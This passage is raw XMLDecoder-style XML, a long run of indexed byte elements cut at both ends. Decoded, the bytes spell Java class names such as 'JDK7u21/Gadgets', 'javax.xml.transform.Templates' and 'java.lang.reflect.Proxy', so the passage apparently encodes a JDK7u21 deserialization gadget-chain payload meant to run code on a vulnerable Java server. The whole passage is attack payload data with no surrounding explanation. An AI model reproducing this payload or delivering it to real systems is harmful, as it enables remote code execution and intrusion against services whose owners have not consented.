&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6144"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6145"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6146"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6147"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6148"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6149"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6150"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6151"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6152"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6153"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6155"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6156"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6157"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6158"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6159"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="6160"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6161"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6162"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6163"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6164"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6165"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6166"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6167"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6168"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6169"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6170"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6171"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6172"&gt; &lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="6173"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6174"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6175"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6176"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6177"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6179"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6180"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6181"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6182"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6183"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6184"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6185"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6186"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6187"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6188"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6189"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6190"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6192"&gt; &lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="6193"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6194"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6195"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="6196"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6197"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6198"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6199"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6200"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6201"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6202"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6203"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6204"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6205"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="6206"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6207"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6208"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6209"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6210"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="6211"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6212"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6213"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6214"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6215"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6216"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6217"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6218"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6219"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6220"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="6221"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6222"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6223"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6224"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6225"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6226"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6228"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6230"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6231"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6233"&gt; &lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6234"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6236"&gt; &lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="6237"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6238"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6239"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="6240"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6241"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6242"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6243"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6244"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6245"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6246"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6247"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6248"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6249"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6250"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6251"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6252"&gt; &lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="6253"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6254"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6255"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6256"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6258"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6259"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6260"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6261"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6262"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6263"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6264"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6265"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6266"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6267"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6268"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6269"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="6270"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6271"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6272"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6273"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6274"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6275"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6277"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6278"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6279"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6280"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6281"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6282"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6283"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6284"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6285"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6286"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6287"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6288"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6289"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6290"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6291"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6292"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6293"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="6294"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6295"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6296"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6297"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6298"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6300"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6301"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6302"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6303"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="6304"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6305"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6306"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6307"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6308"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6309"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6310"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6311"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6312"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6313"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6314"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6315"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6317"&gt; &lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="6319"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6321"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6323"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6325"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6327"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6329"&gt; &lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6331"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6333"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6335"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6337"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6341"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6343"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6345"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6347"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6349"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6351"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6353"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6355"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6359"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6361"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6363"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6367"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6368"&gt; &lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="6369"&gt; &lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6371"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6372"&gt; &lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="6376"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6378"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="6382"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6384"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6388"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6390"&gt; &lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="6394"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6396"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6400"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6402"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6404"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6408"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6410"&gt; &lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="6414"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6416"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6418"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6422"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6424"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6426"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6428"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="6430"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6432"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6433"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6434"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6436"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6437"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="6438"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6439"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6440"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6441"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6442"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6443"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6445"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6446"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6447"&gt; &lt;byte&gt;125&lt;/byte&gt;&lt;/void&gt;&lt;void index="6451"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6453"&gt; &lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="6454"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6455"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6456"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6457"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6458"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6459"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6460"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6461"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6462"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6463"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6464"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6465"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6466"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6467"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6468"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6469"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6470"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6471"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6472"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6473"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6474"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6475"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6476"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6477"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6478"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6479"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6480"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6481"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6482"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6484"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6485"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6486"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6487"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6488"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6489"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6490"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6491"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6492"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6493"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6494"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6495"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6496"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6497"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6498"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6499"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6500"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="6501"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6502"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6503"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6504"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6505"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6506"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6508"&gt; &lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="6509"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6510"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6511"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6512"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6513"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6514"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6515"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6516"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6517"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6518"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6519"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6520"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6521"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6522"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6523"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6524"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6525"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6526"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6527"&gt; &lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="6528"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6529"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6530"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6531"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="6532"&gt; &lt;byte&gt;-31&lt;/byte&gt;&lt;/void&gt;&lt;void index="6533"&gt; &lt;byte&gt;39&lt;/byte&gt;&lt;/void&gt;&lt;void index="6534"&gt; &lt;byte&gt;-38&lt;/byte&gt;&lt;/void&gt;&lt;void index="6535"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="6536"&gt; &lt;byte&gt;-52&lt;/byte&gt;&lt;/void&gt;&lt;void index="6537"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6538"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6539"&gt; &lt;byte&gt;-53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6540"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6542"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6543"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6545"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6546"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6547"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6549"&gt; &lt;byte&gt;37&lt;/byte&gt;&lt;/void&gt;&lt;void index="6550"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6551"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6552"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6553"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6554"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6555"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6556"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6557"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void 